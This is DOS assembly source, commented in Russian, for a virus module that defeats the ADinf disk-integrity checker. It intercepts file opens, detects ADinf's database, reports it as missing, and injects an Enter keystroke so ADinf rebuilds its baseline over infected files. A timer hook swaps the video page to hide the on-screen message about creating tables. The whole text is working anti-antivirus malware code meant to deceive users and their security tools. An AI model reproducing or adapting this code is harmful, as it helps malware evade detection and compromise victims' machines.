;
;  Модуль защиты от Adinf'а. При открытии файла определяет, является ли этот
;  файл базой адинфа. Если да, то есть запущен адинф, который сейчас и
;  открывает этот файл, то говорим что файла не существует. Разумеется,
;  адинф начинает на это ругаться и спрашивать у пользователя запрос на
;  создание новой базы. В этот момент мы кидаем в буфер клавиатуры код
;  Enter'а. И адинф начинает думать, что пользователь согласен. Затем
;  он начинает создавать эти самые базы поверх зараженных файлов.
;  единственное, что остается убрать с экрана надпись "создание
;  таблиц" на "проверка диска". Для этого в момент открытия запоминается
;  изображение экрана и по таймеру копируется на вторую страницу.

New_08:
	call Int08Proc
	byte 0EAh
old_08	Dword 0

Int08Proc:
	test cs:under_1f,255
	jz @r1
	pusha
	push ds
	push es
	
	push 0B800h
	pop es
	push es
	pop ds
	xor cx,cx
	cmp byte ptr ds:[60*2+7*160+1],4Fh
	jnz @n10

	mov si,2400
	mov di,4096+2400
	mov cx,1600/2
	cld
	rep movsw
	mov ch,8
@n10:
	mov dx,03D4h	; сохраняем содержимое регистров видеоплаты
	in al,dx
	push ax
	mov al,0Ch
	mov ah,ch
	out dx,ax	; регистр 03D4 индекс 0C - старший начальный адрес
	dec ax
	mov ah,cl
	out dx,ax	; индекс 0D - младший начальный адрес
	
	pop ax		; восстанавливаем содержимое регистров
	out dx,al
	
	pop es
	pop ds
	popa
@r1:
	retn
	
	
CheckAdinf:
	cmp ah,3Dh
	jz CheckOpenFile
	cmp ah,4Ch
	jnz @ca1
	mov cs:under_1f,0
@ca1:
	retn

CheckOpenFile:
	@CallInt21
	jc @co1
	pusha
	push ds
	push es
	xchg ax,bx
	mov ax,4400h	; проверяем, вдруг это драйвер или символьное
	int 21h		; устройство
	jc @co9
	test dl,128
	jnz @co9
	lea dx,readbuf
	push cs
	pop ds
	push cs
	pop es
	
	mov ah,3Fh
	mov cx,256
	@CallInt21
	jc @co9
		
	lea si,Adinf
	mov di,dx
	call Compare
	jz ItBase
@oc2:
	mov ax,4200h
	xor cx,cx
	xor dx,dx
	@CallInt21
@co9:
	pop es
	pop ds
	popa
	clc
@co1:
	pop cs:_trash
	retf 2
	
Compare:
	cld
	lodsb
ScanNext:
	repnz scasb
	jnz ExitCompare
	push si
	push di
ContinueScan:
	cmp byte ptr ds:[si],0
	jz PopAndExit
	cmpsb
	jz ContinueScan
	pop di
	pop si
	jmp short ScanNext
PopAndExit:
	pop di
	pop si
ExitCompare:
	retn

Adinf		byte 'Diskinfoscope',0
Adinf2		byte 'ADinf',0
Adinf3		byte 'Работа',0

ItBase:	
	push 0B800h
	pop ds
	mov cx,80
	xor si,si
	lea di,readbuf
	push di
	push cx
@ib10:
	lodsw
	stosb
	loop @ib10
	push cs
	pop ds
	lea si,Adinf2
	pop cx
	pop di
	push cx
	push di
	call Compare
	pop di
	pop cx
	jnz @oc2
	lea si,Adinf3
	call Compare
	jnz @oc2
	
	; итак, мы выяснили, что работает адинф и в данный момент он открывет
	; свою базу. Теперь копируем экран на вторую страницу
	
	push 0B800h
	pop ds
	push ds
	pop es
	mov di,4096
	xor si,si
	mov cx,2000
	rep movsw

	mov cs:under_1f,1
	mov ah,5
	mov cx,1C0Dh	; посылаем в буфер Enter
	int 16h
		
	pop es
	pop ds
	popa
	stc
	pop ax
	mov ax,2
	retf 2
